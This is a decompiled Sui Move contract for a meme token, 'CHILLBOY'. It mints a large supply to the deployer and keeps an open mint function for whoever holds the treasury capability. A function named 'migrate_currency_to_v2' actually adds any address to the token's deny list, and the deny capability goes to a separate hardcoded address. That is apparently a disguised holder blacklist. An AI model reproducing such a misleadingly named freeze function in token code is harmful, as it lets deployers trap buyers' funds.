module 0x165895c5c2f387362a39a3fd4b71b9ab6a96cbced062eb28cf4ec5e0a0bff2e3::chillboy {
    struct CHILLBOY has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<CHILLBOY>, arg1: 0x2::coin::Coin<CHILLBOY>) {
        0x2::coin::burn<CHILLBOY>(arg0, arg1);
    }

    fun init(arg0: CHILLBOY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLBOY>(arg0, 9, b"CHILLBOY", b"Just a chill boy", b"I'm just a chill boy on sui", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/DJ6snEdtVpa3SmkYpcAhmdfeYKRx25R3URMxHE4upump.png?size=xl&key=a24037")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLBOY>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLBOY>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CHILLBOY>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLBOY>>(v1, @0x5bc67d4db2b810d18e4653cc386256d47ccd51ab2f2fe96f5992fde5b206f7f7);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLBOY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLBOY>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CHILLBOY>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CHILLBOY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

